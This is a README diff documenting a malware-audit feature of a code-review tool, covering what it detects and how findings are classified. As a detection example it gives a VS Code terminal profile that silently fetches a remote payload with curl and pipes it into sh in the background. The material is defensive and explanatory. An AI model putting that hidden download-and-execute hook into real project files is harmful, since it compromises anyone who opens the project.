@@ -513,6 +513,109 @@ Usage:
 ccw --mode=explain --file=src/main.rs --question="What is the purpose of the main function?"
 ```
 
+## Malware Audit — Security Analysis of Untrusted Repositories
+
+CCW includes a dedicated malware auditing capability designed to identify potentially malicious code and suspicious behavior in software repositories.
+
+This feature is particularly useful when reviewing unfamiliar projects, completing technical interviews, evaluating third-party code, or contributing to open-source repositories.
+
+A repository doesn't need to contain an obviously malicious executable to compromise your machine. Malicious functionality can be hidden in IDE configurations, dependency lifecycle scripts, build processes, shell scripts, or seemingly harmless project configuration files.
+
+### What Does It Detect?
+
+The malware audit investigates suspicious behavior across multiple security categories:
+
+| Category | What it looks for |
+|---|---|
+| Credential Theft | Attempts to access SSH keys, Git credentials, API tokens, environment variables, browser credentials, and cryptocurrency wallet secrets. |
+| Data Exfiltration | Unauthorized transmission of local files, credentials, configuration data, and other sensitive information to external endpoints. |
+| Filesystem Access | Suspicious access to files outside the repository, unauthorized file copying, modification, or deletion. |
+| Remote Code Execution | Downloading and executing remote scripts, shell command injection, dynamic code execution, and suspicious process spawning. |
+| IDE Configuration | Malicious VS Code tasks, terminal profiles, workspace settings, debugger configurations, and extension-related execution. |
+| Supply Chain Attacks | Suspicious dependencies, malicious installation scripts, unexpected package sources, and dependency lifecycle hooks. |
+| Blockchain & Cryptocurrency | Wallet credential extraction, seed phrase collection, unauthorized signing, RPC manipulation, and clipboard hijacking. |
+| Persistence | Attempts to establish unauthorized background processes, scheduled tasks, startup scripts, or system-level persistence. |
+| Obfuscation | Encoded payloads, dynamic imports, concealed execution chains, and suspicious attempts to hide functionality. |
+
+### Evidence-Based Reporting
+
+CCW distinguishes between observed behavior, inferred behavior, and potential impact.
+
+This distinction is important: detecting a command that downloads and executes a remote script does not automatically prove that the downloaded payload steals credentials.
+
+Every finding includes, where available:
+
+- Severity classification.
+- Confidence assessment.
+- Affected file and source location.
+- Relevant code evidence.
+- Description of the observed behavior.
+- Execution trigger.
+- Potential security impact.
+- Data sources and destinations.
+- Recommended mitigation.
+
+The audit also explicitly reports files and dependencies that could not be inspected.
+
+### Security Classification
+
+Each repository receives an overall classification:
+
+| Classification | Meaning |
+|---|---|
+| MALICIOUS | Confirmed malicious functionality. |
+| HIGH RISK | Strong indicators of malicious behavior or dangerous execution paths. |
+| SUSPICIOUS | Unexplained behavior requiring manual investigation. |
+| NO MALICIOUS INDICATORS FOUND | No relevant malicious indicators identified within the inspected scope. |
+| INSUFFICIENT COVERAGE | Not enough repository content was inspected to reach a meaningful conclusion. |
+
+Findings are individually classified as CRITICAL, HIGH, MEDIUM, LOW, or INFO.
+
+### Example: Malicious VS Code Terminal Configuration
+
+Consider a repository containing the following VS Code configuration:
+
+```json
+{
+  "terminal.integrated.profiles.linux": {
+    "bash": {
+      "path": "bash",
+      "args": [
+        "-i",
+        "-c",
+        "setsid bash -c 'curl -s https://example.com/payload | sh' >/dev/null 2>&1 & exec bash -i"
+      ]
+    }
+  }
+}
+```
+
+A conventional source-code review might overlook this configuration.
+
+CCW identifies several suspicious behaviors:
+
+- Remote script downloading.
+- Immediate execution through a shell interpreter.
+- Background process execution.
+- Suppression of command output.
+- Execution when the configured VS Code terminal profile is launched.
+
+The finding is classified as a critical remote execution risk, even if the remote endpoint is unavailable or currently returns HTTP 404.
+
+Importantly, CCW does not claim that the payload steals credentials unless that behavior can actually be established.
+
+### Important Security Notice
+
+Malware auditing is a static analysis capability and cannot guarantee that a repository is safe.
+
+Dynamic behavior, encrypted payloads, unavailable dependencies, conditional execution, and previously unknown attack techniques may prevent complete detection.
+
+**Always treat unfamiliar repositories as untrusted until they have been inspected.**
+
+Run security checks before opening unfamiliar projects in an unrestricted IDE environment, installing dependencies, or executing project scripts.
+
+For additional protection, perform suspicious-project analysis in an isolated environment without access to personal credentials, cryptocurrency wallets, SSH agents, or sensitive files.
+
 ### Performance
 
 Detects performance-related issues.
